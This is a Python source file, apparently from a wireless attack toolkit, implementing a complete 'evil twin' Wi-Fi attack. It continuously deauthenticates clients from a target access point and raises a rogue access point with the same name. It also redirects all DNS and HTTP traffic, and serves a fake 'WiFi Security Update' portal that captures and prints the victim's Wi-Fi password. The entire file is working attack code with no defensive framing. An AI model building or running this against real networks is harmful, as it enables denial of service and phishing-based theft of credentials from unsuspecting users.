import subprocess
import os
import time
import signal
import threading
from ..core.ui import print_status, print_success, print_error, print_warning, Colors
from ..core.config import Config

class EvilTwinAttack:
    def __init__(self, interface, target, deauth_interface=None):
        self.interface = interface
        self.target = target
        self.deauth_interface = deauth_interface or interface
        self.rogue_ap_proc = None
        self.dns_proc = None
        self.web_proc = None
        self.deauth_proc = None
        self.stop_event = threading.Event()

    def start(self):
        print_status(f"Starting Evil Twin attack on {self.target.essid}...")
        
        if not self.check_dependencies():
            return None

        # 1. Setup Configuration Files
        self.create_configs()
        
        # 2. Setup IP Tables and Routing (CRITICAL for Captive Portal)
        self.setup_network()
        
        try:
            # 3. Start Deauth Attack in background to kick victims from real AP
            self.start_deauth()

            # 4. Start Hostapd
            print_status("Starting Rogue Access Point (hostapd)...")
            self.rogue_ap_proc = subprocess.Popen([
                'hostapd', os.path.join(Config.TEMP_DIR, 'hostapd.conf')
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # 5. Start DNSmasq
            print_status("Starting DNS and DHCP services (dnsmasq)...")
            self.dns_proc = subprocess.Popen([
                'dnsmasq', '-C', os.path.join(Config.TEMP_DIR, 'dnsmasq.conf'), '-d'
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # 6. Start Captive Portal (Enhanced Flask Server)
            print_status("Starting Captive Portal web server...")
            self.start_web_server()
            
            print_success("Evil Twin is LIVE!")
            print_warning("Victims are being kicked from original AP and redirected to yours.")
            
            # Monitor for captured password
            while not self.stop_event.is_set():
                pass_file = os.path.join(Config.OUTPUT_DIR, "captured_pass.txt")
                if os.path.exists(pass_file):
                    with open(pass_file, "r") as f:
                        password = f.read().strip()
                        if password:
                            print_success(f"VICTIM ENTERED PASSWORD: {password}")
                            self.stop()
                            return password
                time.sleep(2)
                
        except KeyboardInterrupt:
            self.stop()
        return None

    def start_deauth(self):
        print_status(f"Starting background Deauth on {self.target.bssid} using {self.deauth_interface}...")
        # We run this in a loop to ensure they stay disconnected
        self.deauth_proc = subprocess.Popen([
            'aireplay-ng', '--deauth', '0', # 0 means continuous
            '-a', self.target.bssid,
            self.deauth_interface
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def create_configs(self):
        # Hostapd config
        hostapd_conf = f"""
interface={self.interface}
driver=nl80211
ssid={self.target.essid}
hw_mode=g
channel={self.target.channel}
auth_algs=1
wmm_enabled=0
"""
        with open(os.path.join(Config.TEMP_DIR, 'hostapd.conf'), 'w') as f:
            f.write(hostapd_conf)
            
        # Dnsmasq config - Enhanced for DNS hijacking
        dnsmasq_conf = f"""
interface={self.interface}
dhcp-range=192.168.1.10,192.168.1.100,8h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
address=/#/192.168.1.1
log-queries
log-dhcp
"""
        with open(os.path.join(Config.TEMP_DIR, 'dnsmasq.conf'), 'w') as f:
            f.write(dnsmasq_conf)

    def setup_network(self):
        print_status("Configuring IP tables and routing rules...")
        # Clear old rules
        subprocess.run(['iptables', '--flush'], stdout=subprocess.DEVNULL)
        subprocess.run(['iptables', '--table', 'nat', '--flush'], stdout=subprocess.DEVNULL)
        subprocess.run(['iptables', '--delete-chain'], stdout=subprocess.DEVNULL)
        subprocess.run(['iptables', '--table', 'nat', '--delete-chain'], stdout=subprocess.DEVNULL)
        
        # Set IP for interface
        subprocess.run(['ifconfig', self.interface, 'up', '192.168.1.1', 'netmask', '255.255.255.0'])
        
        # Redirect all HTTP traffic to local port 80
        subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '80', '-j', 'DNAT', '--to-destination', '192.168.1.1:80'])
        # Also redirect DNS if needed (though dnsmasq handles it)
        subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'udp', '--dport', '53', '-j', 'DNAT', '--to-destination', '192.168.1.1:53'])
        
        # Enable IP forwarding
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1')

    def start_web_server(self):
        # Enhanced Captive Portal with Android/iOS detection support
        portal_script = f"""
from flask import Flask, request, redirect, Response
import os

app = Flask(__name__)

@app.route('/')
@app.route('/generate_204') # Android detection
@app.route('/hotspot-detect.html') # iOS detection
def index():
    return '''
    <html>
    <head>
        <title>WiFi Authentication Required</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body {{ font-family: sans-serif; text-align: center; background: #f4f4f4; padding: 20px; }}
            .card {{ background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }}
            input {{ width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }}
            input[type="submit"] {{ background: #007bff; color: white; border: none; cursor: pointer; font-weight: bold; }}
            .logo {{ font-size: 24px; font-weight: bold; color: #333; margin-bottom: 20px; }}
        </style>
    </head>
    <body>
        <div class="card">
            <div class="logo">WiFi Security Update</div>
            <p>A security update has been applied to the router. Please re-enter your WiFi password to verify your identity and restore connection.</p>
            <form action="/login" method="post">
                <input type="password" name="password" placeholder="WiFi Password" required>
                <input type="submit" value="Verify & Connect">
            </form>
        </div>
    </body>
    </html>
    '''

@app.route('/login', methods=['POST'])
def login():
    password = request.form.get('password')
    if password:
        with open('{os.path.join(Config.OUTPUT_DIR, "captured_pass.txt")}', 'w') as f:
            f.write(password)
    return "<h1>Verification Successful. Please wait while your connection is being restored...</h1>"

# Handle all other routes by redirecting to index
@app.errorhandler(404)
def page_not_found(e):
    return redirect('/')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
"""
        with open(os.path.join(Config.TEMP_DIR, 'portal.py'), 'w') as f:
            f.write(portal_script)
            
        self.web_proc = subprocess.Popen(['python3', os.path.join(Config.TEMP_DIR, 'portal.py')], 
                                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def stop(self):
        self.stop_event.set()
        print_status("Shutting down Evil Twin...")
        if self.deauth_proc: self.deauth_proc.terminate()
        if self.rogue_ap_proc: self.rogue_ap_proc.terminate()
        if self.dns_proc: self.dns_proc.terminate()
        if self.web_proc: self.web_proc.terminate()
        
        # Cleanup IP tables
        subprocess.run(['iptables', '--flush'], stdout=subprocess.DEVNULL)
        subprocess.run(['iptables', '-t', 'nat', '--flush'], stdout=subprocess.DEVNULL)
        
        print_success("Evil Twin cleanup complete.")

    def check_dependencies(self):
        import shutil
        deps = ['hostapd', 'dnsmasq', 'python3', 'aireplay-ng', 'iptables']
        for dep in deps:
            if not shutil.which(dep):
                print_error(f"Missing dependency: {dep}")
                return False
        return True
